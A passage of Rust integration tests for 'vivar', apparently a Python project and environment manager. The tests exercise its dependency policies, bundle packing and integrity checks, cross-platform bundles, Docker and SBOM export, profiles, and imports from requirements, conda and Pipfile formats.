        "{}",
        String::from_utf8_lossy(&out.stderr)
    );

    // A wheel from disk is not a hashed registry artifact: refused and rolled back.
    let whl = make_wheel(dir, &tmp.0.join("wheels"));
    let out = run(&["add", whl.to_str().unwrap()]);
    assert!(!out.status.success());
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(stderr.contains("require-hashes"), "{stderr}");
    assert!(!read(&dir.join("pyproject.toml")).contains("minipkg"));

    let doctor = stdout_of(&ok(dir, &["doctor"]));
    assert!(doctor.contains("org policy"), "{doctor}");
}

#[test]
#[ignore = "slow: builds bundles or resolves natively; run with --include-ignored (CI does)"]
fn bundle_integrity_and_diff() {
    let tmp = TempDir::new("integrity");
    let dir = &tmp.0;
    init(dir);
    ok(dir, &["add", "six"]);
    let a = tmp.0.join("a.tar.gz");
    ok(dir, &["pack", "-o", a.to_str().unwrap()]);
    ok(dir, &["add", "pycodestyle"]);
    let b = tmp.0.join("b.tar.gz");
    ok(dir, &["pack", "-o", b.to_str().unwrap()]);

    let diff = stdout_of(&ok(
        &tmp.0,
        &["diff", a.to_str().unwrap(), b.to_str().unwrap()],
    ));
    assert!(diff.contains("+ pycodestyle"), "{diff}");
    assert!(!diff.contains("six"), "{diff}");
    assert_eq!(
        stdout_of(&ok(
            &tmp.0,
            &["diff", a.to_str().unwrap(), a.to_str().unwrap()]
        ))
        .trim(),
        "no differences"
    );

    // A valid old bundle is refused when a newer one is required; the stamp
    // is in the manifest, under the signature.
    let stale = tmp.0.join("stale");
    fails_with(
        &tmp.0,
        &[
            "unpack",
            "--not-before",
            "2999-01-01",
            a.to_str().unwrap(),
            stale.to_str().unwrap(),
        ],
        "was packed on",
    );
    fs::remove_dir_all(&stale).unwrap();
    // A clean unpack verifies; a tampered one is caught at unpack and by verify.
    let good = tmp.0.join("good");
    ok(
        &tmp.0,
        &[
            "unpack",
            "--not-before",
            "2026-10-30",
            a.to_str().unwrap(),
            good.to_str().unwrap(),
        ],
    );
    assert!(stdout_of(&ok(&good, &["verify"])).contains("integrity: all bundled files match"));
    let six = site_packages(&good).join("six.py");
    let mut text = read(&six);
    text.push_str("\n# tampered\n");
    // Installed files are read-only (shared store links); a tamperer would
    // lift that first, so the test does too.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&six, fs::Permissions::from_mode(0o644)).unwrap();
    }
    fs::write(&six, text).unwrap();
    let out = vivar(&good, &["verify"]);
    assert!(!out.status.success());
    assert!(
        stdout_of(&out).contains("six.py (modified)"),
        "{}",
        stdout_of(&out)
    );

    let status = Command::new("tar")
        .current_dir(&good)
        .args(["-czf", tmp.0.join("tampered.tar.gz").to_str().unwrap(), "."])
        .status()
        .unwrap();
    assert!(status.success());
    fails_with(
        &tmp.0,
        &[
            "unpack",
            tmp.0.join("tampered.tar.gz").to_str().unwrap(),
            tmp.0.join("bad").to_str().unwrap(),
        ],
        "integrity check",
    );
}

#[test]
fn doctor_env_completions_and_docker_export() {
    let man_dir = std::env::temp_dir().join(format!("vivar-man-cli-{}", std::process::id()));
    let _ = fs::remove_dir_all(&man_dir);
    let out = ok(Path::new("."), &["man", man_dir.to_str().unwrap()]);
    assert!(stdout_of(&out).contains("man pages"), "{}", stdout_of(&out));
    let add = read(&man_dir.join("vivar-add.1"));
    assert!(
        add.contains(".SH DESCRIPTION") && add.contains("policy"),
        "{add}"
    );
    assert!(man_dir.join("vivar-python-install.1").is_file());
    let _ = fs::remove_dir_all(&man_dir);
    let tmp = TempDir::new("misc");
    let dir = &tmp.0;
    init(dir);
    assert!(stdout_of(&ok(dir, &["completions", "bash"])).contains("vivar"));
    assert!(stdout_of(&ok(dir, &["completions", "powershell"])).contains("vivar"));
    let doctor = stdout_of(&ok(dir, &["doctor"]));
    assert!(
        doctor.contains("project `demo`") && doctor.contains(".venv interpreter runs"),
        "{doctor}"
    );
    let envs = stdout_of(&ok(dir, &["env", "list"]));
    assert!(
        envs.contains("python") && envs.contains("project"),
        "{envs}"
    );
    let docker = stdout_of(&ok(dir, &["export", "docker", "-o", "-"]));
    assert!(
        docker.starts_with("# Generated")
            && docker.contains("FROM python:3.12-slim")
            && docker.contains("uv sync"),
        "{docker}"
    );
    ok(dir, &["export", "docker"]);
    assert!(dir.join("Dockerfile").is_file());

    // An exact pin names an exact image; no pin falls back to requires-python.
    fs::write(dir.join(".python-version"), "3.12.4\n").unwrap();
    assert!(
        stdout_of(&ok(dir, &["export", "docker", "-o", "-"])).contains("FROM python:3.12.4-slim")
    );
    fs::remove_file(dir.join(".python-version")).unwrap();
    assert!(stdout_of(&ok(dir, &["export", "docker", "-o", "-"])).contains("FROM python:3.12-slim"));
}

#[test]
fn workspace_members_share_the_root_env() {
    let tmp = TempDir::new("workspace");
    let root = &tmp.0;
    fs::write(
        root.join("pyproject.toml"),
        "[project]\nname = \"ws\"\nversion = \"0.1.0\"\nrequires-python = \">=3.12\"\ndependencies = []\n\n[tool.uv.workspace]\nmembers = [\"pkgs/*\"]\n\n[tool.vivar.policy]\ndeny = [\"left-pad\"]\n",
    )
    .unwrap();
    fs::write(root.join(".python-version"), "3.12\n").unwrap();
    let member = root.join("pkgs").join("a");
    fs::create_dir_all(member.join("src").join("a")).unwrap();
    fs::write(member.join("src").join("a").join("__init__.py"), "").unwrap();
    fs::write(
        member.join("pyproject.toml"),
        "[project]\nname = \"a\"\nversion = \"0.1.0\"\nrequires-python = \">=3.12\"\ndependencies = [\"six\"]\n\n[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n",
    )
    .unwrap();

    ok(&member, &["sync"]);
    assert!(root.join(".venv").join("pyvenv.cfg").is_file());
    assert!(!member.join(".venv").exists());
    let out = ok(
        &member,
        &["run", "python", "-c", "import six, a; print('ok')"],
    );
    assert_eq!(stdout_of(&out).trim(), "ok");
    assert!(stdout_of(&ok(&member, &["tree"])).contains("six v"));
    // The root's policy reaches members.
    fails_with(&member, &["add", "left-pad"], "deny list");

    // A virtual root (no [project] at all) still gets its environment rolled
    // back after a policy rejection: the rejected package must not stay installed.
    let vroot = tmp.0.join("virtual");
    fs::create_dir_all(vroot.join("pkgs").join("b").join("src").join("b")).unwrap();
    fs::write(
        vroot
            .join("pkgs")
            .join("b")
            .join("src")
            .join("b")
            .join("__init__.py"),
        "",
    )
    .unwrap();
    fs::write(
        vroot.join("pkgs").join("b").join("pyproject.toml"),
        "[project]\nname = \"b\"\nversion = \"0.1.0\"\nrequires-python = \">=3.12\"\ndependencies = []\n\n[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n",
    )
    .unwrap();
    fs::write(
        vroot.join("pyproject.toml"),
        "[tool.uv.workspace]\nmembers = [\"pkgs/*\"]\n\n[dependency-groups]\ndev = [\"six\"]\n",
    )
    .unwrap();
    fs::write(vroot.join(".python-version"), "3.12\n").unwrap();
    ok(&vroot, &["sync"]);
    ok(&vroot, &["run", "python", "-c", "import six"]);
    let strict = tmp.0.join("strict.toml");
    fs::write(&strict, "[policy]\nallow-licenses = [\"MIT\"]\n").unwrap();
    let root = &vroot;
    let out = Command::new(env!("CARGO_BIN_EXE_vivar"))
        .current_dir(root)
        .env("VIVAR_POLICY", &strict)
        .args(["add", "--group", "dev", "typing-extensions"])
        .output()
        .unwrap();
    assert!(!out.status.success());
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("licenses outside"),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(!read(&root.join("pyproject.toml")).contains("typing-extensions"));
    let out = vivar(root, &["run", "python", "-c", "import typing_extensions"]);
    assert!(!out.status.success(), "rejected package is still installed");
    ok(root, &["run", "python", "-c", "import six"]);
}

#[test]
#[ignore = "slow: builds bundles or resolves natively; run with --include-ignored (CI does)"]
fn wheelhouse_export_feeds_an_offline_project() {
    let tmp = TempDir::new("wheelhouse-export");
    let src = tmp.0.join("src");
    fs::create_dir_all(&src).unwrap();
    init(&src);
    ok(&src, &["add", "six", "pycodestyle"]);
    let wh = tmp.0.join("wh");
    let out = ok(&src, &["export", "wheelhouse", "-o", wh.to_str().unwrap()]);
    assert!(
        stdout_of(&out).contains("2 wheel(s)"),
        "{}",
        stdout_of(&out)
    );
    let names: Vec<String> = fs::read_dir(&wh)
        .unwrap()
        .flatten()
        .map(|e| e.file_name().to_string_lossy().into_owned())
        .collect();
    assert!(
        names
            .iter()
            .any(|n| n.starts_with("six-") && n.ends_with(".whl")),
        "{names:?}"
    );
    assert!(
        names.iter().any(|n| n.starts_with("pycodestyle-")),
        "{names:?}"
    );
    // Re-exporting for another machine reuses what's already correct on disk.
    ok(
        &src,
        &[
            "export",
            "wheelhouse",
            "-o",
            wh.to_str().unwrap(),
            "--target",
            "windows-x86_64",
            "--python",
            "3.12",
        ],
    );

    // A second project installs from the wheelhouse with the network disabled.
    let dst = tmp.0.join("dst");
    fs::create_dir_all(&dst).unwrap();
    init(&dst);
    append_policy(&dst, &format!("index-url = {:?}", wh.to_str().unwrap()));
    let out = Command::new(env!("CARGO_BIN_EXE_vivar"))
        .current_dir(&dst)
        .env("UV_OFFLINE", "1")
        .env("UV_NO_CACHE", "1")
        .args(["add", "six", "pycodestyle"])
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    ok(&dst, &["run", "python", "-c", "import six, pycodestyle"]);
}

#[test]
fn drift_note_policy_view_and_json_reports() {
    let tmp = TempDir::new("drift");
    let dir = &tmp.0;
    init(dir);
    ok(dir, &["add", "six"]);
    let out = ok(dir, &["run", "python", "-c", "pass"]);
    assert!(!String::from_utf8_lossy(&out.stderr).contains("uv.lock changed"));
    let lock = dir.join("uv.lock");
    let mut text = read(&lock);
    text.push_str("\n# touched\n");
    fs::write(&lock, text).unwrap();
    let out = ok(dir, &["run", "python", "-c", "pass"]);
    assert!(String::from_utf8_lossy(&out.stderr).contains("uv.lock changed since the last sync"));
    ok(dir, &["sync"]);
    let out = ok(dir, &["run", "python", "-c", "pass"]);
    assert!(!String::from_utf8_lossy(&out.stderr).contains("uv.lock changed"));

    let policy = stdout_of(&ok(dir, &["policy"]));
    assert!(
        policy.contains("effective policy") && policy.contains("pyproject.toml"),
        "{policy}"
    );
    let json = stdout_of(&ok(dir, &["policy", "--json"]));
    assert!(
        json.starts_with("{\"deny\":[]") && json.contains("\"sources\""),
        "{json}"
    );
    let licenses = stdout_of(&ok(dir, &["licenses", "--json"]));
    assert!(
        licenses.contains("{\"name\":\"six\"") && licenses.contains("\"license\":\"MIT\""),
        "{licenses}"
    );
    let verify = stdout_of(&ok(dir, &["verify", "--json"]));
    assert!(
        verify.trim_start().starts_with('{') && verify.contains("\"findings\": []"),
        "{verify}"
    );
    let out = ok(dir, &["export", "requirements"]);
    assert!(stdout_of(&out).contains("requirements.txt"));
    let reqs = read(&dir.join("requirements.txt"));
    assert!(
        reqs.contains("six==") && reqs.contains("--hash=sha256:"),
        "{reqs}"
    );
}

#[test]
fn python_pin_and_uninstall() {
    let tmp = TempDir::new("pypin");
    let dir = &tmp.0;
    init(dir);
    let out = ok(dir, &["python", "pin", "3.12"]);
    assert!(
        stdout_of(&out).contains("pinned demo to CPython 3.12."),
        "{}",
        stdout_of(&out)
    );
    assert_eq!(read(&dir.join(".python-version")).trim(), "3.12");
    assert!(dir.join(".venv").join("pyvenv.cfg").is_file());

    // Uninstall works on a managed build directory, and only on a unique match.
    let (os, libc) = if cfg!(target_os = "linux") {
        ("linux", "gnu")
    } else if cfg!(windows) {
        ("windows", "none")
    } else {
        ("macos", "none")
    };
    let arch = std::env::consts::ARCH;
    let store = tmp.0.join("pythons");
    for v in ["3.9.98", "3.9.99"] {
        fs::create_dir_all(store.join(format!("cpython-{v}-{os}-{arch}-{libc}"))).unwrap();
    }
    let run = |args: &[&str]| {
        Command::new(env!("CARGO_BIN_EXE_vivar"))
            .current_dir(dir)
            .env("UV_PYTHON_INSTALL_DIR", &store)
            .args(args)
            .output()
            .unwrap()
    };
    let out = run(&["python", "uninstall", "3.9"]);
    assert!(!out.status.success());
    assert!(String::from_utf8_lossy(&out.stderr).contains("several builds"));
    let out = run(&["python", "uninstall", "3.9.99"]);
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(!store
        .join(format!("cpython-3.9.99-{os}-{arch}-{libc}"))
        .exists());
    assert!(store
        .join(format!("cpython-3.9.98-{os}-{arch}-{libc}"))
        .exists());
    assert!(!run(&["python", "uninstall", "3.8"]).status.success());
}

#[test]
fn shell_slim_pack_init_lib_and_cuda_routing() {
    let tmp = TempDir::new("misc2");
    let dir = &tmp.0;
    let out = ok(dir, &["init", "demo", "--python", "3.12", "--lib"]);
    assert!(stdout_of(&out).contains("Initialized"));
    assert!(read(&dir.join("pyproject.toml")).contains("hatchling"));
    assert!(dir.join("src").join("demo").join("__init__.py").is_file());
    ok(dir, &["add", "six"]);

    // `shell` runs the user's shell with the env active; feed it one command.
    let mut cmd = Command::new(env!("CARGO_BIN_EXE_vivar"));
    cmd.current_dir(dir)
        .arg("shell")
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped());
    #[cfg(unix)]
    cmd.env("SHELL", "/bin/sh");
    #[cfg(windows)]
    cmd.env("SHELL", "")
        .env("COMSPEC", r"C:\Windows\System32\cmd.exe");
    let mut child = cmd.spawn().unwrap();
    {
        use std::io::Write;
        let stdin = child.stdin.as_mut().unwrap();
        #[cfg(unix)]
        stdin
            .write_all(b"echo shell-sees $VIRTUAL_ENV\nexit\n")
            .unwrap();
        #[cfg(windows)]
        stdin
            .write_all(b"echo shell-sees %VIRTUAL_ENV%\r\nexit\r\n")
            .unwrap();
    }
    let out = child.wait_with_output().unwrap();
    assert!(out.status.success());
    let stdout = stdout_of(&out);
    assert!(
        stdout.contains("shell-sees") && stdout.contains(".venv"),
        "{stdout}"
    );

    // A slim bundle drops libpython on Unix and still unpacks, verifies and runs.
    let archive = tmp.0.join("slim.tar.gz");
    ok(dir, &["pack", "--slim", "-o", archive.to_str().unwrap()]);
    let listing = Command::new("tar")
        .args(["-tzf", archive.to_str().unwrap()])
        .output()
        .unwrap();
    let listing = String::from_utf8_lossy(&listing.stdout);
    if cfg!(unix) {
        assert!(
            !listing.contains("/lib/libpython"),
            "libpython still in slim bundle"
        );
    }
    let dest = tmp.0.join("slim-dest");
    ok(
        &tmp.0,
        &["unpack", archive.to_str().unwrap(), dest.to_str().unwrap()],
    );
    assert!(stdout_of(&ok(&dest, &["verify"])).contains("integrity: all bundled files match"));
    ok(&dest, &["run", "python", "-c", "import six"]);

    // --cuda routes the package to the PyTorch index; mpmath lives there too.
    ok(dir, &["add", "--cuda", "12.4", "mpmath"]);
    let text = read(&dir.join("pyproject.toml"));
    assert!(
        text.contains("download.pytorch.org/whl/cu124")
            && text.contains("mpmath = { index = \"pytorch-cu124\" }"),
        "{text}"
    );
    ok(dir, &["run", "python", "-c", "import mpmath"]);

    // With the API unreachable, --check fails with a clear message, not a panic.
    let out = Command::new(env!("CARGO_BIN_EXE_vivar"))
        .current_dir(dir)
        .env("VIVAR_GITHUB_API", "http://127.0.0.1:9")
        .args(["upgrade", "--check"])
        .output()
        .unwrap();
    assert!(!out.status.success());
    assert!(String::from_utf8_lossy(&out.stderr).contains("failed"));
}

#[test]
#[ignore = "slow: builds bundles or resolves natively; run with --include-ignored (CI does)"]
fn cross_target_pack_builds_a_runnable_bundle() {
    let tmp = TempDir::new("xpack");
    let dir = &tmp.0;
    init(dir);
    ok(dir, &["add", "six", "pycodestyle"]);

    // The same platform as this machine, built the cross-target way: it must unpack and run.
    let here = format!("{}-{}", std::env::consts::OS, std::env::consts::ARCH);
    let archive = tmp.0.join("x.tar.gz");
    let out = vivar(
        dir,
        &[
            "pack",
            "--target",
            &here,
            "--python",
            "3.12",
            "-o",
            archive.to_str().unwrap(),
        ],
    );
    if cfg!(windows) {
        assert!(!out.status.success());
        assert!(String::from_utf8_lossy(&out.stderr).contains("Linux or macOS"));
        return;
    }
    // A Windows bundle built here has vivar's own Windows layout: the venv
    // launchers from the bundled Python, `.cmd` shims, Lib\site-packages.
    let win = tmp.0.join("win.tar.gz");
    ok(
        dir,
        &[
            "pack",
            "--target",
            "windows-x86_64",
            "--python",
            "3.12",
            "-o",
            win.to_str().unwrap(),
        ],
    );
    let listing = Command::new("tar")
        .args(["-tzf", win.to_str().unwrap()])
        .output()
        .unwrap();
    let listing = String::from_utf8_lossy(&listing.stdout);
    for member in [
        ".venv/Scripts/python.exe",
        ".venv/Scripts/pythonw.exe",
        ".venv/Scripts/pycodestyle.cmd",
        ".venv/Scripts/pycodestyle-script.py",
        ".venv/Scripts/activate.bat",
        ".venv/Lib/site-packages/six.py",
        ".venv/pyvenv.cfg",
    ] {
        assert!(listing.contains(member), "{member} missing from\n{listing}");
    }
    assert!(!listing.contains(".venv/bin/"), "{listing}");
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let dest = tmp.0.join("x-dest");
    ok(
        &tmp.0,
        &["unpack", archive.to_str().unwrap(), dest.to_str().unwrap()],
    );
    let out = ok(
        &dest,
        &[
            "run",
            "python",
            "-c",
            "import six, pycodestyle, sys; print(sys.prefix)",
        ],
    );
    assert!(stdout_of(&out).contains("x-dest"), "{}", stdout_of(&out));
    let script = dest.join(".venv").join("bin").join("pycodestyle");
    let out = Command::new(&script).arg("--version").output().unwrap();
    assert!(
        out.status.success(),
        "console script from a cross-built bundle failed"
    );
    assert!(stdout_of(&ok(&dest, &["verify"])).contains("integrity: all bundled files match"));
    // --static checks the unpacked bundle's files without running it: a
    // stray extension built for another interpreter is caught.
    let stray = site_packages(&dest).join("stray.cpython-311-x86_64-linux-gnu.so");
    fs::write(&stray, b"not really").unwrap();
    let out = vivar(&dest, &["verify", "--static"]);
    assert!(!out.status.success());
    let text = stdout_of(&out);
    assert!(
        text.contains("built for CPython 311, not 3.12") && text.contains("not in the bundle"),
        "{text}"
    );
    fs::remove_file(&stray).unwrap();
    assert!(stdout_of(&ok(&dest, &["verify", "--static"])).contains("0 errors"));

    // Another platform: built, listed, structurally right, never executed.
    let other = if cfg!(target_os = "linux") {
        "macos-aarch64"
    } else {
        "linux-x86_64"
    };
    let archive2 = tmp.0.join("other.tar.gz");
    ok(
        dir,
        &[
            "pack",
            "--target",
            other,
            "--python",
            "3.12",
            "-o",
            archive2.to_str().unwrap(),
        ],
    );
    let listing = Command::new("tar")
        .args(["-tzf", archive2.to_str().unwrap()])
        .output()
        .unwrap();
    let listing = String::from_utf8_lossy(&listing.stdout);
    let expect_key = "cpython-3.12.";
    assert!(
        listing.contains(expect_key)
            && listing.contains(".venv/bin/python")
            && listing.contains("site-packages/six.py"),
        "{listing}"
    );
    let diff = stdout_of(&ok(
        &tmp.0,
        &[
            "diff",
            archive.to_str().unwrap(),
            archive2.to_str().unwrap(),
        ],
    ));
    assert!(diff.contains("platform:"), "{diff}");
    // A bundle for another machine is verified statically: integrity, the
    // layout for that platform, every wheel's tags, the launchers.
    let text = stdout_of(&ok(&tmp.0, &["verify", archive2.to_str().unwrap()]));
    assert!(
        text.contains(&format!("static check of a {other} bundle")) && text.contains("0 errors"),
        "{text}"
    );
    let json = stdout_of(&ok(
        &tmp.0,
        &["verify", "--json", archive2.to_str().unwrap()],
    ));
    assert!(
        json.contains("\"static\": true") && json.contains(&format!("\"platform\": \"{other}\"")),
        "{json}"
    );
}

#[test]
fn zstd_pack_when_available() {
    let tmp = TempDir::new("zstd");
    let dir = &tmp.0;
    init(dir);
    let archive = tmp.0.join("z.tar.zst");
    let out = vivar(dir, &["pack", "--zstd", "-o", archive.to_str().unwrap()]);
    if !out.status.success() {
        let err = String::from_utf8_lossy(&out.stderr);
        assert!(err.contains("zstd"), "unexpected failure: {err}");
        return; // no zstd on this machine; the message says so
    }
    let dest = tmp.0.join("z-dest");
    ok(
        &tmp.0,
        &["unpack", archive.to_str().unwrap(), dest.to_str().unwrap()],
    );
    ok(&dest, &["run", "python", "-c", "pass"]);
}

#[test]
fn profiles_env_files_and_policy_env() {
    let tmp = TempDir::new("profiles");
    let dir = &tmp.0;
    init(dir);
    // mpmath is published on PyTorch's indexes too, and is tiny.
    ok(dir, &["profile", "add", "cpu", "mpmath"]);
    let text = read(&dir.join("pyproject.toml"));
    assert!(
        text.contains("download.pytorch.org/whl/cpu") && text.contains("profiles = [\"cpu\"]"),
        "{text}"
    );
    let listing = stdout_of(&ok(dir, &["profile", "list"]));
    assert!(
        listing.contains("cpu") && listing.contains("this machine:"),
        "{listing}"
    );
    ok(dir, &["sync", "--profile", "cpu"]);
    ok(dir, &["run", "python", "-c", "import mpmath"]);
    fails_with(dir, &["sync", "--profile", "nope"], "no profile named");
    ok(dir, &["sync", "--profile", "auto"]);

    // Explicit --cuda routes the named packages; none leaves PyPI alone.
    ok(dir, &["add", "--cuda", "none", "six"]);
    assert!(!read(&dir.join("pyproject.toml")).contains("six = {"));

    // Policy env plus an env file reach the program.
    append_policy(dir, "telemetry = \"off\"\nnetwork = \"offline\"");
    fs::write(
        dir.join(".env"),
        "MYKEY=hello # comment\nexport QUOTED=\"a b\"\n",
    )
    .unwrap();
    let out = ok(dir, &["run", "--env-file", ".env", "python", "-c",
        "import os; print(os.environ['DO_NOT_TRACK'], os.environ['HF_HUB_OFFLINE'], os.environ['MYKEY'], os.environ['QUOTED'])"]);
    assert_eq!(stdout_of(&out).trim(), "1 1 hello a b");
    let policy = stdout_of(&ok(dir, &["policy", "--json"]));
    assert!(
        policy.contains("\"require-hashes\"")
            && policy.contains("\"telemetry\":\"off\"")
            && policy.contains("\"network\":\"offline\""),
        "{policy}"
    );
    assert!(stdout_of(&ok(dir, &["policy"])).contains("telemetry:          off"));

    // The profile .venv was synced with is what pack bundles, locally and cross-target.
    ok(dir, &["sync", "--profile", "cpu"]);
    let archive = tmp.0.join("prof.tar.gz");
    ok(dir, &["pack", "-o", archive.to_str().unwrap()]);
    let dest = tmp.0.join("prof-dest");
    ok(
        &tmp.0,
        &["unpack", archive.to_str().unwrap(), dest.to_str().unwrap()],
    );
    ok(&dest, &["run", "python", "-c", "import mpmath"]);
    assert!(stdout_of(&ok(
        dir,
        &["run", "python", "-c", "import mpmath; print('still here')"]
    ))
    .contains("still here"));
    fails_with(
        dir,
        &["pack", "--profile", "nope", "-o", "x.tar.gz"],
        "no profile named",
    );
    // A profile add that cannot resolve is rolled back without disturbing the active profile.
    assert!(!vivar(
        dir,
        &["profile", "add", "cu999", "definitely-not-on-any-index-xyz"]
    )
    .status
    .success());
    let text = read(&dir.join("pyproject.toml"));
    assert!(!text.contains("cu999"), "{text}");
    ok(dir, &["run", "python", "-c", "import mpmath"]);
    // A second profile rejected by policy after install is rolled back the same way:
    // the active profile stays installed and the project keeps only it.
    append_policy(dir, "allow-licenses = [\"MIT\", \"BSD-3-Clause\"]");
    let out = vivar(dir, &["profile", "add", "cu124", "typing-extensions"]); // PSF-2.0
    assert!(!out.status.success());
    assert!(String::from_utf8_lossy(&out.stderr).contains("licenses outside"));
    let text = read(&dir.join("pyproject.toml"));
    assert!(
        !text.contains("cu124") && text.contains("profiles = [\"cpu\"]"),
        "{text}"
    );
    ok(dir, &["run", "python", "-c", "import mpmath"]);
    let out = vivar(dir, &["run", "python", "-c", "import typing_extensions"]);
    assert!(!out.status.success(), "rejected package is still installed");
    if cfg!(unix) {
        let here = format!("{}-{}", std::env::consts::OS, std::env::consts::ARCH);
        let xarchive = tmp.0.join("xprof.tar.gz");
        ok(
            dir,
            &[
                "pack",
                "--target",
                &here,
                "--python",
                "3.12",
                "--profile",
                "cpu",
                "-o",
                xarchive.to_str().unwrap(),
            ],
        );
        let xdest = tmp.0.join("xprof-dest");
        ok(
            &tmp.0,
            &[
                "unpack",
                xarchive.to_str().unwrap(),
                xdest.to_str().unwrap(),
            ],
        );
        ok(&xdest, &["run", "python", "-c", "import mpmath"]);
    }
}

#[test]
fn kernel_registration_and_cuda_docker_base() {
    let tmp = TempDir::new("kernel");
    let dir = &tmp.0;
    init(dir);
    let jupyter = tmp.0.join("jupyter");
    let run = |args: &[&str]| {
        Command::new(env!("CARGO_BIN_EXE_vivar"))
            .current_dir(dir)
            .env("JUPYTER_DATA_DIR", &jupyter)
            .args(args)
            .output()
            .unwrap()
    };
    let out = run(&["kernel", "install"]);
    assert!(!out.status.success());
    assert!(String::from_utf8_lossy(&out.stderr).contains("ipykernel is not installed"));
    let out = run(&["kernel", "uninstall", ".."]);
    assert!(!out.status.success());
    assert!(String::from_utf8_lossy(&out.stderr).contains("not a usable kernel name"));
    // Stand in for ipykernel: the check only needs the distribution to exist.
    fs::create_dir_all(site_packages(dir).join("ipykernel-6.0.0.dist-info")).unwrap();
    let out = run(&["kernel", "install", "--name", "My Demo"]);
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let spec = read(&jupyter.join("kernels").join("my-demo").join("kernel.json"));
    assert!(
        spec.contains("ipykernel_launcher") && spec.contains("\"vivar\""),
        "{spec}"
    );
    assert!(stdout_of(&run(&["kernel", "list"])).contains("my-demo"));
    assert!(run(&["kernel", "uninstall", "my-demo"]).status.success());
    assert!(!jupyter.join("kernels").join("my-demo").exists());

    if cfg!(target_os = "linux") {
        ok(dir, &["add", "nvidia-cuda-runtime-cu12"]);
        let docker = stdout_of(&ok(dir, &["export", "docker", "-o", "-"]));
        assert!(
            docker.contains("nvidia/cuda:12.") && docker.contains("uv python install 3.12"),
            "{docker}"
        );
    }
}

#[test]
fn import_creates_projects_from_other_formats() {
    let tmp = TempDir::new("import");
    // requirements.txt into an empty directory: init + add in one go.
    let a = tmp.0.join("reqs");
    fs::create_dir_all(&a).unwrap();
    fs::write(
        a.join("requirements.txt"),
        "six>=1.16\npycodestyle  # style\n-e ./local\n",
    )
    .unwrap();
    let out = ok(&a, &["import", "requirements.txt", "--python", "3.12"]);
    let stdout = stdout_of(&out);
    assert!(
        stdout.contains("Initialized project")
            && stdout.contains("added 2 requirement(s)")
            && stdout.contains("skipped: -e ./local"),
        "{stdout}"
    );
    ok(&a, &["run", "python", "-c", "import six, pycodestyle"]);
    let text = read(&a.join("pyproject.toml"));
    assert!(
        text.contains("six>=1.16") && text.contains("pycodestyle"),
        "{text}"
    );

    // A conda environment.yml: python pin, conda-only packages skipped, pip section honoured.
    let b = tmp.0.join("conda");
    fs::create_dir_all(&b).unwrap();
    fs::write(b.join("environment.yml"), "name: sci\ndependencies:\n  - python=3.12\n  - six=1.17\n  - libgcc-ng\n  - pip\n  - pip:\n    - pycodestyle>=2.11\n").unwrap();
    let out = ok(&b, &["import", "environment.yml"]);
    assert!(
        stdout_of(&out).contains("Initialized project `sci`"),
        "{}",
        stdout_of(&out)
    );
    assert!(stdout_of(&out).contains("skipped: libgcc-ng"));
    assert_eq!(read(&b.join(".python-version")).trim(), "3.12");
    ok(&b, &["run", "python", "-c", "import six, pycodestyle"]);

    // A Pipfile with a dev group, imported into an existing project.
    let c = tmp.0.join("pipfile");
    fs::create_dir_all(&c).unwrap();
    init(&c);
    fs::write(
        c.join("Pipfile"),
        "[packages]\nsix = \"*\"\n\n[dev-packages]\npycodestyle = \">=2\"\n",
    )
    .unwrap();
    let out = ok(&c, &["import", "Pipfile"]);
    assert!(
        stdout_of(&out).contains("to group dev"),
        "{}",
        stdout_of(&out)
    );
    let text = read(&c.join("pyproject.toml"));
    assert!(
        text.contains("[dependency-groups]") && text.contains("pycodestyle>=2"),
        "{text}"
    );
}

#[test]
fn check_and_sbom() {
    let tmp = TempDir::new("check");
    let dir = &tmp.0;
    init(dir);
    ok(dir, &["add", "six"]);
    let out = ok(dir, &["check", "--no-audit"]);
    let text = stdout_of(&out);
    assert!(
        text.contains("all checks passed") && text.contains("lock") && text.contains("verify"),
        "{text}"
    );
    let json = stdout_of(&ok(dir, &["check", "--no-audit", "--json"]));
    assert!(
        json.starts_with("{\"ok\":true") && json.contains("\"check\":\"licenses\""),
        "{json}"
    );
    // A hand-edited dependency that is not locked fails the lock check.
    let path = dir.join("pyproject.toml");
    fs::write(
        &path,
        read(&path).replace("\"six", "\"pycodestyle\", \"six"),
    )
    .unwrap();
    let out = vivar(dir, &["check", "--no-audit", "--no-verify"]);
    assert!(!out.status.success());
    assert!(stdout_of(&out).contains("FAIL lock"), "{}", stdout_of(&out));
    ok(dir, &["sync"]);

    for (fmt, marker) in [
        ("cyclonedx", "\"bomFormat\":\"CycloneDX\""),
        ("spdx", "\"spdxVersion\":\"SPDX-2.3\""),
    ] {
        let sbom = stdout_of(&ok(dir, &["export", "sbom", "--format", fmt, "-o", "-"]));
        assert!(
            sbom.contains(marker) && sbom.contains("pkg:pypi/six@"),
            "{sbom}"
        );
        // Valid JSON, as a consumer would parse it.
        fs::write(dir.join("sbom.json"), &sbom).unwrap();
        ok(
            dir,
            &[
                "run",
                "python",
                "-c",
                "import json; json.load(open('sbom.json'))",
            ],
        );
    }
    ok(dir, &["export", "sbom"]);
    assert!(dir.join("sbom.cyclonedx.json").is_file());
}

#[test]
#[ignore = "slow: builds bundles or resolves natively; run with --include-ignored (CI does)"]
fn delta_bundles_dedupe_and_signing() {
    let tmp = TempDir::new("delta");
    let dir = &tmp.0;
    let conf = tmp.0.join("conf");
    let run = |cwd: &Path, args: &[&str]| {
        Command::new(env!("CARGO_BIN_EXE_vivar"))
            .current_dir(cwd)
            .env("XDG_CONFIG_HOME", &conf)
            .env("APPDATA", &conf)
            .args(args)
            .output()
            .unwrap()
    };
    let okr = |cwd: &Path, args: &[&str]| {
        let out = run(cwd, args);
        assert!(
            out.status.success(),
            "vivar {} failed:\n{}{}",
            args.join(" "),
            stdout_of(&out),
